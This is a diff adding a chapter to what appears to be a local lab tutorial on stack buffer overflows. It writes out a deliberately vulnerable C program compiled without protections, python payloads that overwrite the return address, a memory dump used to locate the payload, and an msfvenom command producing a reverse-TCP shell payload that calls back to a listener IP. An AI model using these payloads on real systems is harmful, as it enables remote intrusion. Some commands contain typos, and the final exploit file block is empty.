@@ -519,6 +519,113 @@ gdb-peda -q ./vuln
 ```
 run < input.txt
 ```
+```
+cd ..
+```
+
+## Chapter 2
+
+```
+mkdir chapter2
+```
+```
+cd chapter2
+```
+```
+nano vuln.c
+```
+```
+#include <stdio.h>
+#include <unistd.h>
+
+int help() {
+    system("touch pwned.txt");
+}
+
+int overflow() {
+    char buffer[500];
+    int userinput;
+    userinput = read(0, buffer, 700);
+    printf("User provided %d bytes. Buffer content is: %s\n", userinput, buffer);
+    return 0;
+}
+
+int main(int argc, char * argv[]) {
+    overflow();
+    return 0;
+}
+```
+```
+gcc -g -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
+```
+In another terminal : 
+```
+python3 -c 'print("A"*516+ "B"*4 + "C"*(180) > input.txt
+```
+In first terminal 
+```
+run < input.txt
+```
+```
+p help
+```
+getting adress of helper : 
+```
+info function
+```
+If adress of helper is : 0x004011a9 </br>
+the little endian will be : \xa9\x11\x40\x00 </br>
+Generating shellcode </br>
+RQ : TRANSLATE WITH YOU ADDRESS
+```
+python3 -c 'import sys;sys.stdout.buffer.write(b"A"*516 + b"\xa9\x11\x40\x00" + b"C"*180)' > input.txt
+```
+```
+run < input.txt
+```
+We can jump to ANY ADDESS  </br>
+Generate SHELLCODEIn another terminal : 
+```
+python3 -c 'print("A"*516+ "B"*4 + "C"*(180) > input.txt
+```
+In first terminal 
+```
+run < input.txt
+```
+x/230wx $esp-0x250
+Find where our payload START, where it begin 0x414141
+0xbfffed60:  0x00403eec   0xb7ffeba0   0xbfffefa8   0xb7c53fe5 </br>
+0xbfffed70:  0xb7e1eda0   0x00402018   0xb7ffa020   0xbfffed94 </br>
+0xbfffed90:  0x00402018   0x000002bc   0xbfffeda8   0x00000000 </br>
+0xbfffeda0:  0x00000000   0x41414141   0x41414141   0x41414141 </br>
+0xbfffedb0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffedc0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffedd0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffede0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffedf0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee00:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee10:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee20:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee30:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee40:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee50:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+0xbfffee60:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
+So address is : 0xbfffeda8 </br>
+\xbf\xff\xed\xa8 </br> </br>
+Find adress by 
+```
+ip a
+```
+eg : 192.168.29.152
+```
+msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.29.152 lport=9001 -b "\x00" -f python
+```
+in the location create exploit.py
+```
+
+```
+
+
 
 
 
